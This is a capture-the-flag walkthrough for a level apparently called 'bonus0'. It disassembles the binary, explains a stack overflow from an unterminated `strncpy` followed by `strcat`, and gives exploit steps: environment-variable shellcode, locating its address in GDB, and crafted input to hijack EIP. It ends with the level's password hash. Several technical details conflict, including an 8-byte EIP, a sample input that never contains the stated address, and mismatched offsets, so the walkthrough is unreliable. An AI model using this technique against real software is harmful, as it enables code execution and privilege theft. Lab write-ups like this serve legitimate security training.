# Bonus 0 Walkthrough

## Call Graph
`main` reserves 64 bytes on the stack, calls `pp(&buf)`, then prints the buffer with `puts`.

`pp`:
```asm
sub    esp, 0x50
call   p(buf1, " - ")
call   p(buf2, " - ")
strcpy(dest, buf1)
append " "
strcat(dest, buf2)
```

`p`:
```asm
char buf[0x1000];
puts(prompt);
read(0, buf, 0x1000);
*strchr(buf, '\n') = 0;
return strncpy(dest, buf, 20);
```
`strncpy` copies **exactly** 20 bytes without necessarily writing the null terminator when the source is ≥20 bytes.

## Vulnerability
- The destination buffer in `main` is only `64 - 22 = 42` bytes (because `pp` receives `esp+22`).
- `pp` concatenates up to `20 (first chunk) + 2 (" - ") + 20 (second chunk)` = 42 bytes, but if the first chunk is
exactly 20 bytes, it lacks a trailing `\0`, so `strcat` continues reading into the second chunk and beyond.
- Result: stack buffer overflow that overwrites saved EIP after ~48 bytes. GEF’s `pattern create/search` shows control
is gained after the second chunk plus 9 bytes.

## Exploit
1. Place shellcode in an environment variable (stack is executable):
   ```bash
   export PAYLOAD=$(python3 -c 'print("\\x90"*100 + "<shellcode>")')
   ```
2. Use GDB to find the address of `PAYLOAD`:
   ```bash
   (gdb) x/x environ
   0xbfffff8f: "PAYLOAD=..."
   ```
3. Feed two 20-byte chunks so that the combined concatenation overwrites EIP with `0xbfffff8f`:
   ```
   $ ./bonus0
   - 
   AAAAAAAAAAAAAAAAAAAA
   - 
   BBBBBBBBBBBBBBBBBBBBCCCCDDDD (last 8 bytes become the new EIP)
   ```
4. When `pp` returns, execution jumps to the environment shellcode and spawns a shell; read `/home/user/bonus1/.pass`.

## Flag
```bash
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
